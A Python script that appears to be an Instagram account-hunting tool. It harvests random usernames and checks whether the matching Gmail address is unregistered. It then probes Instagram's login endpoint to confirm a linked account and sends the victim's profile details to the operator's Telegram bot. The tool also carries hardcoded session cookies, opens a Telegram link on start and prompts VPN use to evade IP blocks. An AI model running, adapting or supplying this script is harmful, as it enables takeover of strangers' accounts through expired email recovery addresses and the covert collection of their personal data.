import webbrowser
webbrowser.open('https://t.me/Z_Z_R6')
import requests
import random
from uuid import uuid4
import cfonts
from cfonts import render
import time
import threading
import json
import os
import datetime,sys


Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
Z1 = '\033[2;31m' #احمر ثاني
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
C = "\033[1;97m" #ابيض
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
A = "\033[1;91m" #red
C = "\033[1;97m" #white

os.system('clear')

def azz():
	
	azro = ('''\033[1;33m tool py \033[1;35minstagram   
	\033[1;36mTelegram:\033[1;32m @ziana377\033[1;33m & \033[1;33m@jiooler''')
	for azr in azro.splitlines():
		time.sleep(0.00)
		print(azr)
azz()
print('\033[1;30m+++++++\033[1;37m+++\033[1;32m+\033[1;37m+++\033[1;32m+\033[1;37m+++\033[1;31m+++++++ '*2)
token = input('\033[1;32mENTER TOKEN YOUR  BOT\033[1;33m حط توكن بوتك\033[1;31m:   ')
ID = input('\033[1;32mENTER YOUR ID TELEGRAM\033[1;33mحط ايدي تلغرامك: \033[1;31m  ')
print('\n\n\033[1;30m+++++++\033[1;37m+++\033[1;32m+\033[1;37m+++\033[1;32m+\033[1;37m+++\033[1;31m+++++++ '*2)
sessionid =''
header ={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sessionid}


def hunt(email,user):
	user = str(user)
	email = str(email)
	uid = uuid4()
	url = "https://i.instagram.com/api/v1/accounts/login/"
	headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
	data = {'uuid':uid,  'password':'Hamody@010',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
	req= requests.post(url, headers=headers, data=data).json()
	if req['message'] == 'The password you entered is incorrect. Please try again.':
		he = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar',
'cookie': 'csrftoken=qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI;mid=Yw2UXgAEAAE4Z0qqjhY5LAruCxGL;ig_did=581A8852-CB4E-4DCE-8112-8DBD48CFA6DF;ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'x-asbd-id': '198387',
'x-csrftoken': 'qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
}
		urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'
		re =requests.get(urlg,headers=he).json()
		bio = re["data"]["user"]["biography"]
		followers = re["data"]["user"]["edge_followed_by"]["count"]
		following = re["data"]["user"]["edge_follow"]["count"]
		name = re["data"]["user"]["full_name"]
		id = re["data"]["user"]["id"]
		posts = re["data"]["user"]["edge_owner_to_timeline_media"]["count"]
		date = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}").json()["date"]
		tlg =(f"""
محمد عنان جابلك صيد
[🔱] 𝐍𝐀𝐌𝐄 » {name}
[🔱] 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 » @{user}
[🔱] 𝐄𝐌𝐀𝐈𝐋 » {email}
[🔱] 𝐅𝐎𝐋𝐋𝐎𝐖𝐒 » {followers}
[🔱] 𝐅𝐎𝐋𝐋𝐎𝐖𝐆 » {following}
[🔱] 𝐈𝐃 » {id}
[🔱] 𝐁𝐈𝐎 » {bio}
[🔱] 𝐏𝐎𝐒𝐓𝐒 » {posts}
[🔱] 𝐃𝐀𝐓𝐄 » {date} 
[🔱] TeleGram ==> @ziana377""")
		with open("TRUE ANAN.txt","a") as m:
			m.write(f"{tlg}\n")
		requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
		print(G+tlg)
	if req['message'] == 'The password you entered is incorrect. Please try again or log in with Facebook.':
		he = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'ar',
'cookie': 'csrftoken=qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI;mid=Yw2UXgAEAAE4Z0qqjhY5LAruCxGL;ig_did=581A8852-CB4E-4DCE-8112-8DBD48CFA6DF;ig_nrcb=1',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': '"Windows"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-site',
'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'x-asbd-id': '198387',
'x-csrftoken': 'qLKG0H8Y4BavlpaeJLS8mXsbjyaYWUdI',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': '0',
}
		urlg = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={user}'
		re =requests.get(urlg,headers=he).json()
		bio = re["data"]["user"]["biography"]
		followers = re["data"]["user"]["edge_followed_by"]["count"]
		following = re["data"]["user"]["edge_follow"]["count"]
		name = re["data"]["user"]["full_name"]
		id = re["data"]["user"]["id"]
		posts = re["data"]["user"]["edge_owner_to_timeline_media"]["count"]
		date = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}").json()["date"]
		tlg =(f"""
محمد عنان جابلك صيد
[🔱] 𝐍𝐀𝐌𝐄 » {name}
[🔱] 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 » @{user}
[🔱] 𝐄𝐌𝐀𝐈𝐋 » {email}
[🔱] 𝐅𝐎𝐋𝐋𝐎𝐖𝐒 » {followers}
[🔱] 𝐅𝐎𝐋𝐋𝐎𝐖𝐆 » {following}
[🔱] 𝐈𝐃 » {id}
[🔱] 𝐁𝐈𝐎 » {bio}
[🔱] 𝐏𝐎𝐒𝐓𝐒 » {posts}
[🔱] 𝐃𝐀𝐓𝐄 » {date} 
[🔱] TeleGram ==> @ziana377""")
		with open("MOUAD.txt","a") as m:
			m.write(f"{tlg}\n")
		requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
		print(G+tlg)
	if req['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
		print(f'\033[1;35m  ❌  BaD Instgram «--» {email}')
	else:
		print(f'\033[1;35m ❌   BaD Instgram «--» {email}')
		
def Gmail(email,user):
	eml=str(email)
	email=eml.split('@')[0]+'@gmail.com'
	url = 'https://android.clients.google.com/setup/checkavail'
	headers = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
	data = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'Mouadpython',
		'lastName':'Mouadpython'
	})
	check = requests.post(url,data=data,headers=headers)
	if check.json()['status'] == 'SUCCESS':
		print(f'\033[1;35m  ❌  BaD Instgram : {email}')
		hunt(email,user)
	elif check.json()['status'] =='USERNAME_UNAVAILABLE':
		print (f'\033[1;31m ❌ Bad gmail :: '+email)
	else:
		print(f"{A}YOUR IP BLOCK PLEASE ON VPN ايبي جوالك انحظر شغل vpn  ")
		exit()

def rand():
	while True:
		user='1234567890qwertyuiopasdfghjklzxcvbnm.'
		num='456789'
		rng=int("".join(random.choice(num)for i in range(1)))
		name=str("".join(random.choice(user)for i in range(rng)))
		ch = requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=header)
		mody=0
		if "users" in ch.text:
			for i in ch.json()["users"]:
				mody+=1
				user=(i['user']['username'])
				em = user
				email = em+"@gmail.com"
				Gmail(email,user)
		else:
			rand()

rand()